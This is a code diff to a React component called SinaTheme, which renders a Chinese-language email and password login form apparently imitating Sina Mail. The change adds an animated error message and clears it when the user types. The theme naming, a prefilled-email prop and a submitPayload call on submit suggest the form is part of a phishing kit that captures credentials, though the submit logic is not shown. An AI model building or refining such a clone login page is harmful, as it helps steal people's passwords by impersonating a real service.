@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface SinaThemeProps {
   prefilledEmail?: string;
@@ -11,7 +12,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'free' | 'vip'>('free');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -109,7 +110,10 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                   type="text" 
                   placeholder="输入邮箱名/手机号" 
                   value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  onChange={(e) => {
+                    setEmail(e.target.value);
+                    if (error) setError(null);
+                  }}
                   className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                 />
               </div>
@@ -119,7 +123,10 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                   type="password" 
                   placeholder="输入密码" 
                   value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  onChange={(e) => {
+                    setPassword(e.target.value);
+                    if (error) setError(null);
+                  }}
                   className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                 />
               </div>
@@ -144,6 +151,16 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                   注册
                 </button>
               </div>
+
+              {error && (
+                <motion.div 
+                  initial={{ opacity: 0, y: -10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  className="text-red-500 text-[12px] text-center font-medium py-1"
+                >
+                  {error}
+                </motion.div>
+              )}
 
               {/* Bottom links and social */}
               <div className="flex items-center justify-between text-[11px] pt-4 border-t border-gray-50">
